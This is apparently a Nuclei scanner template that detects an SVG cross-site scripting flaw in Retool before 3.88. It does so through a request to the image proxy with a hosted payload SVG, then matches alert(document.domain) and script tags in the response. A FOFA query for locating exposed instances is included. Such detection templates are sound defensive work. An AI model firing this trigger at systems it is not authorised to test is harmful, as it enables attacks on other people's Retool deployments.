http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - alert(document.domain);
    - <?xml version
    - <script type="text/javascript">
  - negative: true
    part: header
    type: word
    words:
    - 'Content-Security-Policy: default-src ''none'';'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
    HTTP/1.1

    Host: {{Hostname}}

    '
id: retool-svg-xss
info:
  author: iamnoooob,iamnoooob,pdresearch
  description: 'This template checks for SVG Cross-Site Scripting(XSS) vulnerability
    via the Image Proxy URL parameter in Retool.

    '
  metadata:
    fofa-query: body="x-retool"
    max-request: 1
    verified: true
  name: Retool < 3.88 - SVG Cross-Site Scripting
  reference:
  - https://docs.retool.com/releases/edge/3.88#:~:text=Fixed%20an%20SVG%20XSS%20vulnerability%20by%20adding%20a%20CSP.%20(%2349381)
  severity: high
  tags: retool,xss,vuln
